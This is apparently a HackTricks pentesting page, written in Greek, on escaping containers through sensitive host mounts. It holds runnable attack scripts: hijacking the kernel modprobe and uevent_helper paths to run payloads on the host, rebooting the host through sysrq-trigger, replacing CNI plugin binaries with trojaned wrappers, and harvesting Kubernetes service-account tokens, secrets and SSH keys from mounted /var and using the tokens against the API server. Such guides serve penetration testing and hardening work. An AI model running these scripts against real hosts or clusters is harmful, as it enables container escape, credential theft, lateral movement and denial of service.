# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Host mounts είναι μία από τις πιο σημαντικές πρακτικές επιφάνειες container-escape, επειδή συχνά καταρρίπτουν μια προσεκτικά απομονωμένη process view και τη μετατρέπουν σε άμεση ορατότητα host resources. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Bind mounts του `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ή device-related paths μπορούν να εκθέσουν kernel controls, credentials, neighboring container filesystems και runtime management interfaces.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις μεμονωμένες protection pages επειδή το abuse model είναι cross-cutting. Ένα writable host mount είναι επικίνδυνο εν μέρει λόγω των mount namespaces, εν μέρει λόγω των user namespaces, εν μέρει λόγω της κάλυψης από AppArmor ή SELinux, και εν μέρει λόγω του ποιο ακριβώς host path εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστό θέμα κάνει το attack surface πολύ πιο εύκολο να το σκεφτεί κανείς.

## `/proc` Exposure

Το procfs περιέχει τόσο συνηθισμένες process πληροφορίες όσο και interfaces υψηλού αντίκτυπου για kernel control. Ένα bind mount όπως `-v /proc:/host/proc` ή μια container view που εκθέτει απρόσμενα writable proc entries μπορεί επομένως να οδηγήσει σε information disclosure, denial of service ή άμεση host code execution.

Τα procfs paths υψηλής αξίας περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Ξεκινήστε ελέγχοντας ποια high-value procfs entries είναι ορατά ή writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Αυτά τα paths είναι ενδιαφέροντα για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe`, και `binfmt_misc` μπορούν να γίνουν host code-execution paths όταν είναι writable. Τα `kallsyms`, `kmsg`, `kcore`, και `config.gz` είναι ισχυρές πηγές reconnaissance για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν το context του process, του cgroup, και του filesystem, κάτι που μπορεί να βοηθήσει στην ανακατασκευή του host layout από μέσα από το container.

Η πρακτική αξία κάθε path είναι διαφορετική, και το να τα αντιμετωπίζεις όλα σαν να είχαν την ίδια επίδραση κάνει το triage πιο δύσκολο:

- `/proc/sys/kernel/core_pattern`
Αν είναι writable, αυτό είναι ένα από τα υψηλότερου αντίκτυπου procfs paths επειδή ο kernel θα εκτελέσει έναν pipe handler μετά από ένα crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path μπορεί συχνά να αποκτήσει host code execution. Δες επίσης [read-only-paths.md](protections/read-only-paths.md) για ένα αφιερωμένο παράδειγμα.
- `/proc/sys/kernel/modprobe`
Αυτό το path ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει module-loading logic. Αν είναι writable από το container και ερμηνεύεται στο host context, μπορεί να γίνει ένα ακόμα host code-execution primitive. Είναι ιδιαίτερα ενδιαφέρον όταν συνδυάζεται με έναν τρόπο να trigger το helper path.
- `/proc/sys/vm/panic_on_oom`
Αυτό συνήθως δεν είναι ένα καθαρό escape primitive, αλλά μπορεί να μετατρέψει το memory pressure σε host-wide denial of service, αλλάζοντας τις OOM conditions σε kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Αν το registration interface είναι writable, ο attacker μπορεί να κάνει register έναν handler για μια επιλεγμένη magic value και να αποκτήσει execution σε host context όταν εκτελείται ένα matching file.
- `/proc/config.gz`
Χρήσιμο για kernel exploit triage. Βοηθά να καθοριστεί ποια subsystems, mitigations, και optional kernel features είναι ενεργοποιημένα χωρίς να χρειάζεται host package metadata.
- `/proc/sysrq-trigger`
Κυρίως ένα denial-of-service path, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic, ή με άλλον τρόπο να διαταράξει αμέσως το host.
- `/proc/kmsg`
Αποκαλύπτει kernel ring buffer messages. Χρήσιμο για host fingerprinting, crash analysis, και σε ορισμένα environments για leaking πληροφοριών που βοηθούν στο kernel exploitation.
- `/proc/kallsyms`
Πολύτιμο όταν είναι readable επειδή εκθέτει exported kernel symbol information και μπορεί να βοηθήσει να ξεπεραστούν address randomization assumptions κατά το kernel exploit development.
- `/proc/[pid]/mem`
Αυτό είναι ένα direct process-memory interface. Αν το target process είναι reachable με τις απαραίτητες ptrace-style συνθήκες, μπορεί να επιτρέψει reading ή modifying της μνήμης ενός άλλου process. Ο ρεαλιστικός αντίκτυπος εξαρτάται πολύ από credentials, `hidepid`, Yama, και ptrace restrictions, οπότε είναι ένα ισχυρό αλλά conditionally διαθέσιμο path.
- `/proc/kcore`
Εκθέτει μια core-image-style προβολή της system memory. Το αρχείο είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά readable δείχνει μια σοβαρά εκτεθειμένη host memory surface.
- `/proc/kmem` και `/proc/mem`
Ιστορικά interfaces ακατέργαστης μνήμης με υψηλό αντίκτυπο. Σε πολλά σύγχρονα systems είναι disabled ή έντονα restricted, αλλά αν υπάρχουν και μπορούν να χρησιμοποιηθούν πρέπει να αντιμετωπίζονται ως critical findings.
- `/proc/sched_debug`
Διαρρέει scheduling και task information που μπορεί να εκθέσει host process identities ακόμη κι όταν άλλες process views φαίνονται πιο καθαρές από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
Εξαιρετικά χρήσιμο για να ανακατασκευάσεις πού πραγματικά ζει το container στον host, ποια paths είναι overlay-backed, και αν ένα writable mount αντιστοιχεί σε host content ή μόνο στο container layer.

Αν το `/proc/[pid]/mountinfo` ή τα overlay details είναι readable, χρησιμοποίησέ τα για να ανακτήσεις το host path του container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν να μετατραπεί ένα path μέσα στο container στο αντίστοιχο path από τη σκοπιά του host.

### Full Example: `modprobe` Helper Path Abuse

Αν το `/proc/sys/kernel/modprobe` είναι writable από το container και το helper path ερμηνεύεται στο host context, μπορεί να ανακατευθυνθεί σε ένα payload υπό τον έλεγχο του attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Το ακριβές trigger εξαρτάται από το target και τη συμπεριφορά του kernel, αλλά το σημαντικό σημείο είναι ότι ένα writable helper path μπορεί να ανακατευθύνει μια μελλοντική kernel helper invocation σε attacker-controlled host-path content.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Αν ο στόχος είναι exploitability assessment και όχι άμεσο escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντήσεις αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν πρόσφατα kernel messages αποκαλύπτουν ενδιαφέρουσα κατάσταση, και ποια kernel features ή mitigations είναι compiled in. Η επίδραση συνήθως δεν είναι άμεσο escape, αλλά μπορεί να συντομεύσει σημαντικά το triage για kernel-vulnerability.

### Full Example: SysRq Host Reboot

Αν το `/proc/sysrq-trigger` είναι writable και φτάνει στο host view:
```bash
echo b > /proc/sysrq-trigger
```
Η επίδραση είναι άμεσο host reboot. Αυτό δεν είναι ένα διακριτικό παράδειγμα, αλλά δείχνει καθαρά ότι το procfs exposure μπορεί να είναι πολύ πιο σοβαρό από ένα information disclosure.

## `/sys` Exposure

Το sysfs εκθέτει μεγάλες ποσότητες από kernel και device state. Ορισμένα sysfs paths είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν helper execution, device behavior, security-module configuration ή firmware state.

Τα sysfs paths υψηλής αξίας περιλαμβάνουν:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτά τα paths έχουν σημασία για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει το thermal-management behavior και, επομένως, το host stability σε περιβάλλοντα με κακή exposure. Το `/sys/kernel/vmcoreinfo` μπορεί να leak crash-dump και kernel-layout πληροφορίες που βοηθούν στο low-level host fingerprinting. Το `/sys/kernel/security` είναι το `securityfs` interface που χρησιμοποιείται από τα Linux Security Modules, οπότε απρόσμενη πρόσβαση εκεί μπορεί να expose ή να alter MAC-related state. Τα EFI variable paths μπορούν να επηρεάσουν firmware-backed boot settings, καθιστώντας τα πολύ πιο σοβαρά από συνηθισμένα configuration files. Το `debugfs` κάτω από `/sys/kernel/debug` είναι ιδιαίτερα dangerous επειδή είναι σκόπιμα ένα developer-oriented interface με πολύ λιγότερες safety expectations από hardened production-facing kernel APIs.

Χρήσιμες review commands για αυτά τα paths είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι κάνει αυτά τα commands ενδιαφέροντα:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποια άλλη LSM surface είναι ορατή με τρόπο που θα έπρεπε να παραμένει μόνο για host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι mounted και readable ή writable, να περιμένετε μια ευρεία kernel-facing surface της οποίας ο ακριβής κίνδυνος εξαρτάται από τα ενεργοποιημένα debug nodes.
- Η έκθεση EFI variable είναι λιγότερο συνηθισμένη, αλλά αν υπάρχει είναι υψηλού αντίκτυπου, επειδή αφορά firmware-backed settings και όχι συνηθισμένα runtime files.
- Το `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με hardware, όχι ένα καθαρό shell-style escape.
- Το `/sys/kernel/vmcoreinfo` είναι κυρίως πηγή για host-fingerprinting και crash-analysis, χρήσιμη για την κατανόηση του low-level kernel state.

### Full Example: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι writable, ο kernel μπορεί να εκτελέσει έναν attacker-controlled helper όταν ενεργοποιηθεί ένα `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Ο λόγος που αυτό λειτουργεί είναι ότι η διαδρομή του helper ερμηνεύεται από την οπτική γωνία του host. Μόλις ενεργοποιηθεί, ο helper εκτελείται στο host context αντί μέσα στο τρέχον container.

## `/var` Exposure

Η προσάρτηση του host's `/var` σε ένα container συχνά υποτιμάται επειδή δεν φαίνεται τόσο δραματική όσο η προσάρτηση του `/`. Στην πράξη, μπορεί να αρκεί για πρόσβαση σε runtime sockets, σε καταλόγους snapshot των container, σε volumes pod που διαχειρίζεται το kubelet, σε projected service-account tokens και σε filesystems γειτονικών εφαρμογών. Σε σύγχρονους nodes, το `/var` είναι συχνά το σημείο όπου πραγματικά βρίσκεται το πιο επιχειρησιακά ενδιαφέρον container state.

### Kubernetes Example

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει τα projected tokens άλλων pods και το περιεχόμενο των overlay snapshots:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν αν το mount εκθέτει μόνο βαρετά application data ή υψηλού αντίκτυπου cluster credentials. Ένα αναγνώσιμο service-account token μπορεί αμέσως να μετατρέψει το local code execution σε Kubernetes API access.

Αν το token υπάρχει, επικύρωσε τι μπορεί να προσεγγίσει αντί να σταματήσεις στην ανακάλυψη του token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από το local node access. Ένα token με broad RBAC μπορεί να μετατρέψει ένα mounted `/var` σε cluster-wide compromise.

### Docker And containerd Example

Σε Docker hosts τα σχετικά δεδομένα βρίσκονται συχνά κάτω από `/var/lib/docker`, ενώ σε containerd-backed Kubernetes nodes μπορεί να είναι κάτω από `/var/lib/containerd` ή σε snapshotter-specific paths:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Εάν το mounted `/var` εκθέτει writable snapshot contents από άλλο workload, ο attacker μπορεί να είναι σε θέση να τροποποιήσει application files, να φυτέψει web content ή να αλλάξει startup scripts χωρίς να αγγίξει το τρέχον container configuration.

Συγκεκριμένες ιδέες abuse μόλις βρεθεί writable snapshot content:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων των mounted `/var`: application tampering, secret recovery, και lateral movement σε γειτονικά workloads.

## Kubelet State, Plugins, And CNI Paths

Ένα mount του `/var/lib/kubelet`, `/opt/cni/bin`, ή `/etc/cni/net.d` συχνά εκτίθεται μέσω privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, και storage helpers. Αυτά τα mounts είναι εύκολο να απορριφθούν ως "node plumbing", αλλά βρίσκονται απευθείας στο execution path για νέα pods και συχνά περιέχουν kubelet credentials, projected secrets, registration sockets, και executable host-side plugin binaries.

High-value targets include:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Γιατί αυτά τα paths έχουν σημασία:

- Το `/var/lib/kubelet/pki` μπορεί να αποκαλύψει kubelet client certificates και άλλα node-local credentials που μερικές φορές μπορούν να επαναχρησιμοποιηθούν απέναντι στο API server ή σε kubelet-facing TLS endpoints, ανάλογα με το cluster design.
- Το `/var/lib/kubelet/pods` συχνά περιέχει projected service-account tokens και mounted Secrets για neighboring pods στο ίδιο node.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` είναι κυρίως surface για reconnaissance, αλλά πολύ χρήσιμο: αποκαλύπτει ποια pods και containers κατέχουν αυτή τη στιγμή GPUs, hugepages, SR-IOV devices και άλλους scarce node-local resources.
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA, και device plugins είναι εγκατεστημένα και με ποια sockets το kubelet αναμένεται να επικοινωνεί. Αν αυτά τα directories είναι writable αντί για απλώς readable, το finding γίνεται πολύ πιο σοβαρό.
- Τα `/opt/cni/bin` και `/etc/cni/net.d` βρίσκονται απευθείας στο pod-network setup path. Το writable access εκεί συχνά είναι ένα delayed host-execution primitive και όχι απλώς configuration exposure.

### Full Example: Writable `/opt/cni/bin`

Αν ένα host CNI binary directory είναι mounted read-write, η αντικατάσταση ενός plugin μπορεί να αρκεί για να αποκτηθεί host execution την επόμενη φορά που το kubelet δημιουργεί ένα pod sandbox σε εκείνο το node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Αυτό δεν είναι τόσο άμεσο όσο ένα mounted `docker.sock`, αλλά συχνά είναι πιο ρεαλιστικό σε compromised Kubernetes infrastructure pods. Το σημαντικό σημείο είναι ότι το τροποποιημένο binary εκτελείται αργότερα από το host network setup flow, όχι από το τρέχον container.


## Runtime Sockets

Τα sensitive host mounts συχνά περιλαμβάνουν runtime sockets αντί για πλήρη directories. Είναι τόσο σημαντικά που αξίζουν ρητή επανάληψη εδώ:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρεις ροές exploitation μόλις ένα από αυτά τα sockets γίνει mount.

Ως ένα γρήγορο πρώτο interaction pattern:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Αν ένα από αυτά πετύχει, η διαδρομή από το "mounted socket" στο "start a more privileged sibling container" είναι συνήθως πολύ πιο σύντομη από οποιαδήποτε kernel breakout path.

## Mount-Related CVEs

Τα host mounts επίσης τέμνονται με runtime vulnerabilities. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- `CVE-2024-21626` στο `runc`, όπου ένα leaked directory file descriptor θα μπορούσε να τοποθετήσει το working directory στο host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, και `CVE-2024-23653` στο BuildKit, όπου malicious Dockerfiles, frontends, και `RUN --mount` flows θα μπορούσαν να επανεισαγάγουν host file access, deletion, ή elevated privileges κατά τη διάρκεια builds.
- `CVE-2024-1753` στα Buildah και Podman build flows, όπου crafted bind mounts κατά τη διάρκεια build θα μπορούσαν να εκθέσουν το `/` read-write.
- `CVE-2025-47290` στο `containerd` 2.1.0, όπου ένα TOCTOU κατά το image unpack θα μπορούσε να επιτρέψει σε ένα specially crafted image να τροποποιήσει το host filesystem κατά τη διάρκεια pull.

Αυτά τα CVEs έχουν σημασία εδώ επειδή δείχνουν ότι το mount handling δεν αφορά μόνο το operator configuration. Το ίδιο το runtime μπορεί επίσης να εισάγει mount-driven escape conditions.

## Checks

Χρησιμοποίησε αυτές τις εντολές για να εντοπίσεις γρήγορα τα mount exposures με τη μεγαλύτερη αξία:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Τι είναι ενδιαφέρον εδώ:

- Host root, `/proc`, `/sys`, `/var`, και runtime sockets είναι όλα ευρήματα υψηλής προτεραιότητας.
- Εγγράψιμες εγγραφές στο proc/sys συχνά σημαίνουν ότι το mount εκθέτει host-global kernel controls αντί για ένα ασφαλές container view.
- Mounted `/var` paths αξίζουν review για credentials και neighboring-workload, όχι μόνο review του filesystem.
- Kubelet state directories και CNI/plugin paths αξίζουν την ίδια προτεραιότητα με τα runtime sockets επειδή συχνά βρίσκονται απευθείας στο node's pod-creation και credential-distribution path.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
